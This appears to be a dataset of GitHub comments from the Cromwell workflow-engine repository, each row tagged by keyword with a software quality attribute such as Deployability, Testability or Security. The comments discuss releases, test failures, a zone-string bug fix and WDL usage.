https://github.com/broadinstitute/cromwell/issues/7217#issuecomment-1717897693:15,Usability,feedback,feedback,15,"Per prior user feedback,; > [HSQLDB has got to be the worst performing embedded database designed in the history of mankind.](https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757). and we do not recommend it, like, at all, unless your use case is tiny. Likewise, `run` mode is; > [Appropriate for prototyping or demo use on a user's local machine. Features are limited and the web API is not supported.](https://cromwell.readthedocs.io/en/stable/Modes/). For real workflows – certainly anything running more than 1 hour – the path is `server` mode with a daemon-type relational DB like PostgreSQL or MySQL.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7217#issuecomment-1717897693
https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880:91,Availability,error,error,91,@dvoet wouldn't adding the changeset at the beginning of the log cause checksum/validation error for Cromwells that are already deployed?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880
https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880:128,Deployability,deploy,deployed,128,@dvoet wouldn't adding the changeset at the beginning of the log cause checksum/validation error for Cromwells that are already deployed?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880
https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880:71,Security,checksum,checksum,71,@dvoet wouldn't adding the changeset at the beginning of the log cause checksum/validation error for Cromwells that are already deployed?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880
https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880:80,Security,validat,validation,80,@dvoet wouldn't adding the changeset at the beginning of the log cause checksum/validation error for Cromwells that are already deployed?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880
https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880:61,Testability,log,log,61,@dvoet wouldn't adding the changeset at the beginning of the log cause checksum/validation error for Cromwells that are already deployed?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7218#issuecomment-1719874880
https://github.com/broadinstitute/cromwell/pull/7221#issuecomment-1731940109:47,Testability,test,test,47,"This is almost ready, having trouble getting a test that uses subworkflows working.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7221#issuecomment-1731940109
https://github.com/broadinstitute/cromwell/pull/7221#issuecomment-1758452459:25,Availability,failure,failure,25,"Looking into a real test failure here, works for me in IntelliJ but failing in GHA.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7221#issuecomment-1758452459
https://github.com/broadinstitute/cromwell/pull/7221#issuecomment-1758452459:20,Testability,test,test,20,"Looking into a real test failure here, works for me in IntelliJ but failing in GHA.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7221#issuecomment-1758452459
https://github.com/broadinstitute/cromwell/issues/7222#issuecomment-1743447572:70,Deployability,release,release,70,"I'm not sure about the specifics your issue, but the latest [Cromwell release (version 86) ](https://github.com/broadinstitute/cromwell/releases) has some improvements related to pulling docker images.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7222#issuecomment-1743447572
https://github.com/broadinstitute/cromwell/issues/7222#issuecomment-1743447572:136,Deployability,release,releases,136,"I'm not sure about the specifics your issue, but the latest [Cromwell release (version 86) ](https://github.com/broadinstitute/cromwell/releases) has some improvements related to pulling docker images.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7222#issuecomment-1743447572
https://github.com/broadinstitute/cromwell/pull/7228#issuecomment-1747137867:62,Availability,mainten,maintenance,62,"NOTE: The publishing-contract tests are failing due to active maintenance on the pact broker. That said, the updated query doesn't change any behavior or payloads from Cromwell so there shouldn't be any changes to the contracts to begin with.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7228#issuecomment-1747137867
https://github.com/broadinstitute/cromwell/pull/7228#issuecomment-1747137867:109,Deployability,update,updated,109,"NOTE: The publishing-contract tests are failing due to active maintenance on the pact broker. That said, the updated query doesn't change any behavior or payloads from Cromwell so there shouldn't be any changes to the contracts to begin with.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7228#issuecomment-1747137867
https://github.com/broadinstitute/cromwell/pull/7228#issuecomment-1747137867:21,Integrability,contract,contract,21,"NOTE: The publishing-contract tests are failing due to active maintenance on the pact broker. That said, the updated query doesn't change any behavior or payloads from Cromwell so there shouldn't be any changes to the contracts to begin with.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7228#issuecomment-1747137867
https://github.com/broadinstitute/cromwell/pull/7228#issuecomment-1747137867:218,Integrability,contract,contracts,218,"NOTE: The publishing-contract tests are failing due to active maintenance on the pact broker. That said, the updated query doesn't change any behavior or payloads from Cromwell so there shouldn't be any changes to the contracts to begin with.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7228#issuecomment-1747137867
https://github.com/broadinstitute/cromwell/pull/7228#issuecomment-1747137867:30,Testability,test,tests,30,"NOTE: The publishing-contract tests are failing due to active maintenance on the pact broker. That said, the updated query doesn't change any behavior or payloads from Cromwell so there shouldn't be any changes to the contracts to begin with.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7228#issuecomment-1747137867
https://github.com/broadinstitute/cromwell/issues/7232#issuecomment-1746194617:1311,Testability,test,test,1311,"It seems this [line](https://github.com/broadinstitute/cromwell/blob/d967bcdba2cf8d321c34837eceba2b48a62aa42b/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/util/BatchUtilityConversions.scala#L14) in the cromwell code is building the zones string like ""zones/us-central1-a,uscentral1-b"", where the spec according to google [https://cloud.google.com/java/docs/reference/google-cloud-batch/latest/com.google.cloud.batch.v1.AllocationPolicy.LocationPolicy.Builder#com_google_cloud_batch_v1_AllocationPolicy_LocationPolicy_Builder_addAllowedLocations_java_lang_String_](https://cloud.google.com/java/docs/reference/google-cloud-batch/latest/com.google.cloud.batch.v1.AllocationPolicy.LocationPolicy.Builder#com_google_cloud_batch_v1_AllocationPolicy_LocationPolicy_Builder_addAllowedLocations_java_lang_String_) is to have ""zones/"" before each one when it is used [here](https://github.com/broadinstitute/cromwell/blob/d967bcdba2cf8d321c34837eceba2b48a62aa42b/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/api/GcpBatchRequestFactoryImpl.scala#L207) in the code. . So the likely fix should be:. ```scala; def toZonesPath(zones: Vector[String]): String = {; zones.map(zone => ""zones/"" + zone).mkString("",""); }; ```; but I don't have the ability to build and test a cromwell executable.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7232#issuecomment-1746194617
https://github.com/broadinstitute/cromwell/issues/7232#issuecomment-1773193840:58,Deployability,update,update,58,Thanks for providing code recommendation! Submitted PR to update.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7232#issuecomment-1773193840
https://github.com/broadinstitute/cromwell/pull/7235#issuecomment-1761688679:52,Testability,test,test,52,Thanks @dspeck1! We approved and I'm re-running one test to see if it de-flakes.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7235#issuecomment-1761688679
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1768780207:231,Testability,test,testing,231,"I am running into this exact same issue:. `docker: invalid spec: /mnt/disks/cromwell_root:/mnt/disks/cromwell_root:: empty section between colons.`. With a very similar backend. I was able to run this workflow last week when I was testing, and have just noticed this behavior this week. Not sure what GCP side change may have caused this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1768780207
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885019150:70,Deployability,patch,patch,70,hey @dspeck1 or @jgainerdewar just wondering if there is a plan for a patch release to fix the current cromwell release?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885019150
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885019150:76,Deployability,release,release,76,hey @dspeck1 or @jgainerdewar just wondering if there is a plan for a patch release to fix the current cromwell release?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885019150
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885019150:112,Deployability,release,release,112,hey @dspeck1 or @jgainerdewar just wondering if there is a plan for a patch release to fix the current cromwell release?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885019150
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885342414:84,Availability,avail,available,84,"We don't typically patch releases, but we do make the latest version from `develop` available in a Docker image. Folks who want the latest changes between major releases are advised to use these development versions, ex. `87-225ea5a`, which are named with the next major version and short hash of the merge commit. https://hub.docker.com/r/broadinstitute/cromwell/tags",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885342414
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885342414:19,Deployability,patch,patch,19,"We don't typically patch releases, but we do make the latest version from `develop` available in a Docker image. Folks who want the latest changes between major releases are advised to use these development versions, ex. `87-225ea5a`, which are named with the next major version and short hash of the merge commit. https://hub.docker.com/r/broadinstitute/cromwell/tags",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885342414
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885342414:25,Deployability,release,releases,25,"We don't typically patch releases, but we do make the latest version from `develop` available in a Docker image. Folks who want the latest changes between major releases are advised to use these development versions, ex. `87-225ea5a`, which are named with the next major version and short hash of the merge commit. https://hub.docker.com/r/broadinstitute/cromwell/tags",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885342414
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885342414:161,Deployability,release,releases,161,"We don't typically patch releases, but we do make the latest version from `develop` available in a Docker image. Folks who want the latest changes between major releases are advised to use these development versions, ex. `87-225ea5a`, which are named with the next major version and short hash of the merge commit. https://hub.docker.com/r/broadinstitute/cromwell/tags",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885342414
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885342414:289,Security,hash,hash,289,"We don't typically patch releases, but we do make the latest version from `develop` available in a Docker image. Folks who want the latest changes between major releases are advised to use these development versions, ex. `87-225ea5a`, which are named with the next major version and short hash of the merge commit. https://hub.docker.com/r/broadinstitute/cromwell/tags",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885342414
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1955561946:85,Deployability,release,release,85,"thanks for the docker image! just wondering, when should we expect the next cromwell release?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1955561946
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1956772844:52,Deployability,update,updates,52,We recommend `broadinstitute/cromwell:latest` which updates regularly.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1956772844
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1956878481:92,Availability,down,downstream,92,"@aednichols understood, however I would really recommend at least a patch release. Building downstream reliance on the latest docker image for any software (especially when latest appears to represent a SNAPSHOT version and not a release) is a recipe for breaking your system that allows unanticipated changes to be applied",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1956878481
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1956878481:68,Deployability,patch,patch,68,"@aednichols understood, however I would really recommend at least a patch release. Building downstream reliance on the latest docker image for any software (especially when latest appears to represent a SNAPSHOT version and not a release) is a recipe for breaking your system that allows unanticipated changes to be applied",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1956878481
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1956878481:74,Deployability,release,release,74,"@aednichols understood, however I would really recommend at least a patch release. Building downstream reliance on the latest docker image for any software (especially when latest appears to represent a SNAPSHOT version and not a release) is a recipe for breaking your system that allows unanticipated changes to be applied",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1956878481
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1956878481:230,Deployability,release,release,230,"@aednichols understood, however I would really recommend at least a patch release. Building downstream reliance on the latest docker image for any software (especially when latest appears to represent a SNAPSHOT version and not a release) is a recipe for breaking your system that allows unanticipated changes to be applied",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1956878481
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959974506:46,Deployability,continuous,continuous,46,"I hear you @patmagee. Cromwell has had a SaaS continuous development model for a few years now, with new code going to Terra daily. We learned that most standalone Cromwell users at the Broad upgrade infrequently, such as every 6-12 months. Thus, we committed put in the effort for two ""shrink-wrapped"" releases per year so we can balance SaaS with standalone.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959974506
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959974506:192,Deployability,upgrade,upgrade,192,"I hear you @patmagee. Cromwell has had a SaaS continuous development model for a few years now, with new code going to Terra daily. We learned that most standalone Cromwell users at the Broad upgrade infrequently, such as every 6-12 months. Thus, we committed put in the effort for two ""shrink-wrapped"" releases per year so we can balance SaaS with standalone.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959974506
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959974506:303,Deployability,release,releases,303,"I hear you @patmagee. Cromwell has had a SaaS continuous development model for a few years now, with new code going to Terra daily. We learned that most standalone Cromwell users at the Broad upgrade infrequently, such as every 6-12 months. Thus, we committed put in the effort for two ""shrink-wrapped"" releases per year so we can balance SaaS with standalone.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959974506
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959974506:294,Integrability,wrap,wrapped,294,"I hear you @patmagee. Cromwell has had a SaaS continuous development model for a few years now, with new code going to Terra daily. We learned that most standalone Cromwell users at the Broad upgrade infrequently, such as every 6-12 months. Thus, we committed put in the effort for two ""shrink-wrapped"" releases per year so we can balance SaaS with standalone.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959974506
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959974506:135,Usability,learn,learned,135,"I hear you @patmagee. Cromwell has had a SaaS continuous development model for a few years now, with new code going to Terra daily. We learned that most standalone Cromwell users at the Broad upgrade infrequently, such as every 6-12 months. Thus, we committed put in the effort for two ""shrink-wrapped"" releases per year so we can balance SaaS with standalone.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959974506
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959979057:25,Deployability,release,releases,25,"Also, the shrink-wrapped releases never had any additional testing done compared to the daily snapshots; the daily system works for us because we have a TON of tests on every PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959979057
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959979057:17,Integrability,wrap,wrapped,17,"Also, the shrink-wrapped releases never had any additional testing done compared to the daily snapshots; the daily system works for us because we have a TON of tests on every PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959979057
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959979057:59,Testability,test,testing,59,"Also, the shrink-wrapped releases never had any additional testing done compared to the daily snapshots; the daily system works for us because we have a TON of tests on every PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959979057
https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959979057:160,Testability,test,tests,160,"Also, the shrink-wrapped releases never had any additional testing done compared to the daily snapshots; the daily system works for us because we have a TON of tests on every PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1959979057
https://github.com/broadinstitute/cromwell/pull/7239#issuecomment-1781780497:18,Availability,failure,failure,18,GCP Batch backend failure doesn't block merging.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7239#issuecomment-1781780497
https://github.com/broadinstitute/cromwell/issues/7247#issuecomment-1927394538:33,Deployability,update,update,33,Your config most likely needs an update to remove usage of the `languages.cwl.CwlV1_0LanguageFactory` class referenced in the exception.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7247#issuecomment-1927394538
https://github.com/broadinstitute/cromwell/issues/7247#issuecomment-1927394538:5,Modifiability,config,config,5,Your config most likely needs an update to remove usage of the `languages.cwl.CwlV1_0LanguageFactory` class referenced in the exception.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7247#issuecomment-1927394538
https://github.com/broadinstitute/cromwell/issues/7249#issuecomment-1846184654:416,Safety,avoid,avoiding,416,"Cromwell does not support WDL 1.1 at the moment, although I think there may still be an underlying bug here -- I have seen odd behavior in Cromwell using Structs in WDL 1.0 where the contents of the struct may be undefined. If you want to use WDL 1.1, I recommend [miniwdl](https://github.com/chanzuckerberg/miniwdl) as an alternative to Cromwell. If you need to use Cromwell (eg you need to use Terra), I recommend avoiding any optional types when using structs through some combination of `select_first()` and only interacting with your optional file `if length(some_array_with_optional_in_it) > 0`. You can also use `defined()`, but be aware that `defined(output_of_task_that_did_not_run)` can be true in some cases.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7249#issuecomment-1846184654
https://github.com/broadinstitute/cromwell/issues/7249#issuecomment-1858364933:158,Safety,safe,safety,158,"Hi, thanks for the reply. I was using `version development` which I had assumed meant it had at least the 1.1 features (including `None`). I agree using some safety checks and `select_first` can work, but often using the above paradigm with `None` can be a lot clearer/easier to work with in code.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7249#issuecomment-1858364933
https://github.com/broadinstitute/cromwell/issues/7249#issuecomment-1858364933:261,Usability,clear,clearer,261,"Hi, thanks for the reply. I was using `version development` which I had assumed meant it had at least the 1.1 features (including `None`). I agree using some safety checks and `select_first` can work, but often using the above paradigm with `None` can be a lot clearer/easier to work with in code.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7249#issuecomment-1858364933
https://github.com/broadinstitute/cromwell/pull/7327#issuecomment-1839465165:29,Testability,test,test,29,Appreciate you keeping these test/build scripts in tip-top shape. Big fan of red diffs!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7327#issuecomment-1839465165
https://github.com/broadinstitute/cromwell/pull/7329#issuecomment-1839446766:8,Testability,log,log,8,Example log output:. ```; +---------------------+; | total_workflows_run |; +---------------------+; | 382 |; +---------------------+; ```. ```; +----------------------------------------------+-----------------+----------------------------+----------------------------+; | name | runtime_minutes | start | end |; +----------------------------------------------+-----------------+----------------------------+----------------------------+; | lots_of_inputs | 49 | 2023-12-04 19:11:09.757000 | 2023-12-04 20:00:16.994000 |; | localize_file_larger_than_disk_space | 37 | 2023-12-04 19:06:22.131000 | 2023-12-04 19:44:00.567000 |; | call_cache_capoeira | 27 | 2023-12-04 19:06:42.671000 | 2023-12-04 19:34:22.956000 |; | draft3_call_cache_capoeira | 25 | 2023-12-04 19:17:55.395000 | 2023-12-04 19:43:15.246000 |; | papi_v2_plain_detritus | 21 | 2023-12-04 19:17:40.056000 | 2023-12-04 19:38:45.885000 |; | drs_usa_jdr | 20 | 2023-12-04 19:17:33.937000 | 2023-12-04 19:37:43.666000 |; | invalid_runtime_attributes_wf | 20 | 2023-12-04 19:16:21.027000 | 2023-12-04 19:36:30.736000 |; | google_labels | 18 | 2023-12-04 19:18:30.077000 | 2023-12-04 19:36:59.395000 |; | sub_workflow_interactions_scatter | 18 | 2023-12-04 19:12:20.127000 | 2023-12-04 19:30:25.295000 |; | required_files | 16 | 2023-12-04 19:06:31.390000 | 2023-12-04 19:23:08.186000 |; | restart_while_failing | 16 | 2023-12-04 19:40:06.430000 | 2023-12-04 19:56:26.294000 |; | invalidate_bad_caches_no_copy | 16 | 2023-12-04 19:12:11.857000 | 2023-12-04 19:28:40.915000 |; | cromwell_restart | 16 | 2023-12-04 19:11:25.197000 | 2023-12-04 19:27:37.625000 |; | custom_entrypoint_wf | 15 | 2023-12-04 19:06:15.944000 | 2023-12-04 19:21:24.272000 |; | write_lines_files | 15 | 2023-12-04 19:08:39.450000 | 2023-12-04 19:24:22.746000 |; | draft3_read_file_limits | 15 | 2023-12-04 19:05:25.828000 | 2023-12-04 19:20:38.471000 |; | sub_workflow_interactions | 15 | 2023-12-04 19:11:22.137000 | 2023-12-04 19:27:07.156000 |; | sizeenginefunction ,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7329#issuecomment-1839446766
https://github.com/broadinstitute/cromwell/pull/7338#issuecomment-1847803816:0,Integrability,synchroniz,synchronize,0,synchronize,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7338#issuecomment-1847803816
https://github.com/broadinstitute/cromwell/pull/7350#issuecomment-1877250668:8,Deployability,update,updated,8,LGTM! I updated [this doc](https://docs.google.com/document/d/1X1mpcUtsukeWez82UpXAXkX7SJpcSB-pZk1lFwd6LUA/edit) to reflect the change here.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7350#issuecomment-1877250668
https://github.com/broadinstitute/cromwell/pull/7350#issuecomment-1877275322:4,Deployability,update,updated,4,> I updated this doc. Thanks!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7350#issuecomment-1877275322
https://github.com/broadinstitute/cromwell/pull/7353#issuecomment-1887415376:77,Testability,test,tests,77,"Hi @bchen4, thanks for the PR. I created a clone inside the repo to run unit tests: https://github.com/broadinstitute/cromwell/pull/7353. The tests didn't compile at first which I fixed, but now they are failing and I don't actually know which is wrong, the assertion or the code under test. I added you as a writer to this repo so you should be able to push to my `aen_wx_1420` branch that my PR uses.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7353#issuecomment-1887415376
https://github.com/broadinstitute/cromwell/pull/7353#issuecomment-1887415376:142,Testability,test,tests,142,"Hi @bchen4, thanks for the PR. I created a clone inside the repo to run unit tests: https://github.com/broadinstitute/cromwell/pull/7353. The tests didn't compile at first which I fixed, but now they are failing and I don't actually know which is wrong, the assertion or the code under test. I added you as a writer to this repo so you should be able to push to my `aen_wx_1420` branch that my PR uses.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7353#issuecomment-1887415376
https://github.com/broadinstitute/cromwell/pull/7353#issuecomment-1887415376:258,Testability,assert,assertion,258,"Hi @bchen4, thanks for the PR. I created a clone inside the repo to run unit tests: https://github.com/broadinstitute/cromwell/pull/7353. The tests didn't compile at first which I fixed, but now they are failing and I don't actually know which is wrong, the assertion or the code under test. I added you as a writer to this repo so you should be able to push to my `aen_wx_1420` branch that my PR uses.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7353#issuecomment-1887415376
https://github.com/broadinstitute/cromwell/pull/7353#issuecomment-1887415376:286,Testability,test,test,286,"Hi @bchen4, thanks for the PR. I created a clone inside the repo to run unit tests: https://github.com/broadinstitute/cromwell/pull/7353. The tests didn't compile at first which I fixed, but now they are failing and I don't actually know which is wrong, the assertion or the code under test. I added you as a writer to this repo so you should be able to push to my `aen_wx_1420` branch that my PR uses.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7353#issuecomment-1887415376
https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887927577:39,Testability,test,test,39,> scalafmt. Fixed that by removing the test case. Now unit tests passed but the codecov failed.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887927577
https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887927577:59,Testability,test,tests,59,> scalafmt. Fixed that by removing the test case. Now unit tests passed but the codecov failed.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887927577
https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887936453:112,Energy Efficiency,green,green,112,"Codecov isn't a mandatory check, we just don't have a way to tell Github to display the number without a red or green check.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887936453
https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887940650:114,Energy Efficiency,green,green,114,"> Codecov isn't a mandatory check, we just don't have a way to tell Github to display the number without a red or green check. Cool, so pending one more approval and then merge? (also finger cross on other tests)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887940650
